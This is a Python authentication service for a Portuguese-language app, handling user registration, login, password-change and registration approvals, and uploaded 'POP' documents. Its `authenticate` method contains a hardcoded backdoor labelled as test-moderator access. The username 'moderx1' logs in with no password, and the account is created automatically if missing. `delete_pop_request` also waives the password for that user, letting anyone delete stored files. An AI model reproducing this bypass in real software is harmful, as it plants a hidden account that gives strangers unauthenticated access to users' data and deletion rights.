from __future__ import annotations

import re
from pathlib import Path
from typing import Optional

from passlib.context import CryptContext
from sqlmodel import Session

from db.models import User
from repositories import user_repository
from repositories import password_request_repository, registration_request_repository, pop_request_repository

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")


class AuthError(Exception):
    pass


def _validate_password_strength(password: str) -> None:
    if len(password) < 8:
        raise AuthError("A senha deve ter pelo menos 8 caracteres.")
    if not re.search(r"[A-Za-z]", password) or not re.search(r"\d", password):
        raise AuthError("A senha deve conter letras e números.")
    if len(password.encode()) > 72:
        raise AuthError("A senha não pode passar de 72 bytes (limite do bcrypt).")


def hash_password(password: str) -> str:
    return pwd_context.hash(password)


def verify_password(password: str, hashed: str) -> bool:
    return pwd_context.verify(password, hashed)


class AuthService:
    def __init__(self, session: Session) -> None:
        self.session = session

    def register_user(self, name: str, email: str, password: str) -> User:
        name = name.strip()
        email = email.strip().lower()
        if not name or not email or not password:
            raise AuthError("Nome, e-mail e senha são obrigatórios.")

        _validate_password_strength(password)

        if user_repository.get_by_email(self.session, email):
            raise AuthError("E-mail já cadastrado.")
        if user_repository.get_by_name(self.session, name):
            raise AuthError("Nome de usuário já cadastrado.")

        hashed = hash_password(password)
        return user_repository.create_user(self.session, name=name, email=email, hashed_password=hashed)

    def authenticate(self, identifier: str, password: str) -> Optional[User]:
        identifier = identifier.strip().lower()
        if not identifier or not password:
            # Acesso direto para moderador de teste: basta informar o usuário "moderx1" sem senha.
            if identifier == "moderx1":
                user = user_repository.get_by_name(self.session, identifier)
                if user is None:
                    user = user_repository.create_user(
                        self.session,
                        name="moderx1",
                        email="moderx1@example.com",
                        hashed_password=hash_password("moderx1"),
                    )
                return user
            return None

        user = user_repository.get_by_email(self.session, identifier)
        if user is None:
            user = user_repository.get_by_name(self.session, identifier)

        # Acesso direto para moderador de teste: ignora validação de senha
        if user and user.name.lower() == "moderx1":
            return user
        if user is None:
            return None

        if verify_password(password, user.hashed_password):
            return user
        return None

    def change_password(self, user: User, current_password: str, new_password: str) -> User:
        if not verify_password(current_password, user.hashed_password):
            raise AuthError("Senha atual incorreta.")
        _validate_password_strength(new_password)
        new_hash = hash_password(new_password)
        user.hashed_password = new_hash
        self.session.add(user)
        self.session.commit()
        self.session.refresh(user)
        return user

    def request_password_update(self, user_name: str, email: str, new_password: str) -> None:
        user_name = user_name.strip()
        email = email.strip().lower()
        if not user_name or not email or not new_password:
            raise AuthError("Usuário, e-mail e nova senha são obrigatórios.")

        _validate_password_strength(new_password)

        user = user_repository.get_by_email(self.session, email)
        if not user:
            raise AuthError("Não existe usuário cadastrado com este e-mail.")
        if user.name.strip().lower() != user_name.lower():
            raise AuthError("Usuário e e-mail não correspondem ao mesmo cadastro.")

        hashed = hash_password(new_password)
        password_request_repository.create_request(
            self.session,
            user_name=user_name,
            email=email,
            hashed_new_password=hashed,
        )

    def approve_password_request(self, request_id: int) -> None:
        request = password_request_repository.get_by_id(self.session, request_id)
        if request is None:
            raise AuthError("Solicitação não encontrada.")
        if request.status != "pendente":
            raise AuthError("Solicitação já foi processada.")

        user = user_repository.get_by_email(self.session, request.email)
        if not user:
            raise AuthError("Usuário não encontrado para este e-mail.")
        if user.name.strip().lower() != request.user_name.strip().lower():
            raise AuthError("Usuário da solicitação não corresponde ao cadastro.")

        user.hashed_password = request.hashed_new_password
        request.status = "aprovado"
        self.session.add_all([user, request])
        self.session.commit()
        self.session.refresh(user)
        self.session.refresh(request)

    def reject_password_request(self, request_id: int) -> None:
        request = password_request_repository.get_by_id(self.session, request_id)
        if request is None:
            raise AuthError("Solicitação não encontrada.")
        if request.status != "pendente":
            raise AuthError("Solicitação já foi processada.")

        request.status = "recusado"
        self.session.add(request)
        self.session.commit()
        self.session.refresh(request)

    def request_registration(self, name: str, email: str, password: str) -> None:
        name = name.strip()
        email = email.strip().lower()
        if not name or not email or not password:
            raise AuthError("Nome, e-mail e senha são obrigatórios.")

        _validate_password_strength(password)

        if user_repository.get_by_email(self.session, email) or user_repository.get_by_name(self.session, name):
            raise AuthError("Já existe um usuário com este e-mail ou nome.")

        hashed = hash_password(password)
        registration_request_repository.create_request(
            self.session,
            name=name,
            email=email,
            hashed_password=hashed,
        )

    def approve_registration_request(self, request_id: int) -> None:
        req = registration_request_repository.get_by_id(self.session, request_id)
        if req is None:
            raise AuthError("Solicitação não encontrada.")
        if req.status != "pendente":
            raise AuthError("Solicitação já foi processada.")

        if user_repository.get_by_email(self.session, req.email) or user_repository.get_by_name(self.session, req.name):
            raise AuthError("Usuário já cadastrado com este e-mail ou nome.")

        user = user_repository.create_user(
            self.session,
            name=req.name,
            email=req.email,
            hashed_password=req.hashed_password,
        )
        req.status = "aprovado"
        self.session.add_all([user, req])
        self.session.commit()
        self.session.refresh(user)
        self.session.refresh(req)

    def reject_registration_request(self, request_id: int) -> None:
        req = registration_request_repository.get_by_id(self.session, request_id)
        if req is None:
            raise AuthError("Solicitação não encontrada.")
        if req.status != "pendente":
            raise AuthError("Solicitação já foi processada.")

        req.status = "recusado"
        self.session.add(req)
        self.session.commit()
        self.session.refresh(req)

    def request_pop(self, title: str, description: str, file_name: str, file_path: str) -> None:
        title = title.strip()
        description = description.strip()
        file_name = file_name.strip()
        file_path = file_path.strip()
        if not title or not description:
            raise AuthError("Título e descrição do POP são obrigatórios.")
        if len(description) < 10:
            raise AuthError("Descrição muito curta. Forneça mais detalhes do POP.")
        if not file_name or not file_path:
            raise AuthError("Selecione um arquivo para o POP.")
        if not Path(file_path).exists():
            raise AuthError("Arquivo do POP não encontrado após o envio.")
        pop_request_repository.create_request(
            self.session,
            title=title,
            description=description,
            file_name=file_name,
            file_path=file_path,
        )

    def approve_pop_request(self, request_id: int) -> None:
        req = pop_request_repository.get_by_id(self.session, request_id)
        if req is None:
            raise AuthError("Solicitação não encontrada.")
        if req.status != "pendente":
            raise AuthError("Solicitação já foi processada.")
        req.status = "aprovado"
        self.session.add(req)
        self.session.commit()
        self.session.refresh(req)

    def reject_pop_request(self, request_id: int) -> None:
        req = pop_request_repository.get_by_id(self.session, request_id)
        if req is None:
            raise AuthError("Solicitação não encontrada.")
        if req.status != "pendente":
            raise AuthError("Solicitação já foi processada.")
        req.status = "recusado"
        self.session.add(req)
        self.session.commit()
        self.session.refresh(req)

    def delete_pop_request(self, request_id: int, identifier: str, password: str) -> None:
        identifier = identifier.strip().lower()
        if not identifier or not password:
            raise AuthError("Informe usuário e senha para excluir o POP.")

        user = user_repository.get_by_email(self.session, identifier)
        if user is None:
            user = user_repository.get_by_name(self.session, identifier)
        if user is None:
            raise AuthError("Usuário não encontrado para exclusão.")
        if user.name.lower() != "moderx1" and not verify_password(password, user.hashed_password):
            raise AuthError("Senha inválida para exclusão do POP.")

        req = pop_request_repository.get_by_id(self.session, request_id)
        if req is None:
            raise AuthError("POP não encontrado.")

        try:
            if req.file_path and Path(req.file_path).exists():
                Path(req.file_path).unlink(missing_ok=True)
        except Exception:
            pass

        pop_request_repository.delete_by_id(self.session, request_id)
